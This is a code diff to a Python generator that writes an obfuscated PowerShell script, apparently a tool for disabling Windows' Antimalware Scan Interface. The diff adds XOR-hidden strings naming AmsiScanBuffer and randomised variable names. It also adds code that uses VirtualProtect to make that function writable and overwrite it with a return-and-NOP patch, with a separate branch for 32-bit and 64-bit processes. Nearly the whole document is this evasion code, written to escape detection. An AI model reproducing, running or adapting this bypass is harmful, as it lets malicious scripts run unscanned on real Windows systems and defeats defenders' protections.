@@ -18,7 +18,7 @@ def xor(data, key):
 def printCiphertext(ciphertext):
 	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
 
-strings = {"a","b","c","d","e","f","g","h","i","xa","xb","xc","xd","xe","xf"}
+strings = {"a","b","c","d","e","f","g","h","i","j","k","l","m","xa","xb","xc","xd","xe","xf","xg","xh"}
 
 for s in strings:
 	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))
@@ -31,6 +31,8 @@ system=("system.dll")
 kernel=("kernel32.dll")
 vproc1 = ("Virtua")
 vproc2 = ("lProtect")
+ascnbf1 = ("Ams")
+ascnbf2 = ("iScanBuffer")
 
 xorkey = random.choice(string.ascii_letters)
 
@@ -40,6 +42,8 @@ xoredC = xor(system, xorkey)
 xoredD = xor(kernel, xorkey)
 xoredE = xor(vproc1, xorkey)
 xoredF = xor(vproc2, xorkey)
+xoredG = xor(ascnbf1, xorkey)
+xoredH = xor(ascnbf2, xorkey)
 
 xoredBytesA = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredA))
 xoredBytesB = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredB))
@@ -47,6 +51,8 @@ xoredBytesC = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredC))
 xoredBytesD = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredD))
 xoredBytesE = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredE))
 xoredBytesF = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredF))
+xoredBytesG = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredG))
+xoredBytesH = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredH))
 xorkeyBytes = ('0x'.join(hex(ord(x))[:] for x in xorkey))
 
 
@@ -82,12 +88,17 @@ function {b} {{
 }}
 
 [Byte[]] ${c} =  0x48, 0x31, 0xC0
+[byte[]] ${l} = 0x90
+[byte[]] ${m} = 0xc3
+[Byte[]] ${k} =  ${m} + ${l} + ${l}
 [Byte[]] ${xa} = {xoredBytesA}
 [byte[]] ${xb} = {xoredBytesB}
 [Byte[]] ${xc} = {xoredBytesC}
 [byte[]] ${xd} = {xoredBytesD}
 [Byte[]] ${xe} = {xoredBytesE}
 [Byte[]] ${xf} = {xoredBytesF}
+[Byte[]] ${xg} = {xoredBytesG}
+[Byte[]] ${xh} = {xoredBytesH}
 
 for($i=0; $i -lt ${xa}.count ; $i++)
 {{
@@ -135,12 +146,39 @@ $f = [System.Text.Encoding]::ASCII.GetString(${xf})
 $e = $e+$f
 $e
 
-[IntPtr]${f} = {a} $a $b
+for($i=0; $i -lt ${xg}.count ; $i++)
+{{
+    ${xg}[$i] = ${xg}[$i] -bxor {xorkeyBytes}
+}}
+
+$g = [System.Text.Encoding]::ASCII.GetString(${xg})
+
+for($i=0; $i -lt ${xh}.count ; $i++)
+{{
+    ${xh}[$i] = ${xh}[$i] -bxor {xorkeyBytes}
+}}
+
+$h = [System.Text.Encoding]::ASCII.GetString(${xh})
+$g = $g+$h
+
 $aaar = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(({a} $d $e), ({b} @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+
+if ([Environment]::Is64BitProcess -ne [Environment]::Is64BitOperatingSystem)
+{{
+[IntPtr]${f} = {a} $a $b
 $vp.Invoke(${f}, 3, 0x40, [ref]$aaar)
 [System.Runtime.InteropServices.Marshal]::Copy(${c}, 0, ${f}, 3)
 $vp.Invoke(${f}, 3, 0x20, [ref]$aaar)
+}}
+else
+{{
+[IntPtr]${j} = {a} $a $g
+$vp.Invoke(${j} , 3, 0x40, [ref]$aaar)
+[System.Runtime.InteropServices.Marshal]::Copy(${k}, 0, ${j} , 3)
+$vp.Invoke(${j} , 3, 0x20, [ref]$aaar)
+}}
+
 '''
-open("AM-C-bypass.ps1", "w").write(ps1)
+open("1.ps1", "w").write(ps1)
 
